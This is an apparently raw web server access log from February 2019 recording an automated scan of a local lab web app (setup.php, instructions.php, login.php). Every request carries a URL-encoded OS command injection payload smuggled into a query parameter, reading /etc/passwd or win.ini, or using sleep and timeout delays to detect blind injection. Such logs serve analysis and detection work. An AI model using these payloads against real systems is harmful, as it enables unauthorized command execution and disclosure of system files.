172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%26sleep+15%26 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%3Bsleep+15%3B HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%26sleep+15%26 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%3Bsleep+15%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%26timeout+%2FT+15 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%3Bget-help HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%3Bget-help HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%27%3Bget-help HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%3Bget-help+%23 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%26timeout+%2FT+15 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /favicon.ico?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%3Bget-help HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%3Bget-help HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%27%3Bget-help HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%3Bget-help+%23 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%26sleep+15%26 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%26sleep+15%26 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%3Bsleep+15%3B HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%3Bsleep+15%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%26sleep+15%26%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%3Bsleep+15%3B%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%26sleep+%7B0%7D%26 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /instructions.php?doc=PHPIDS-license%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /login.php?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
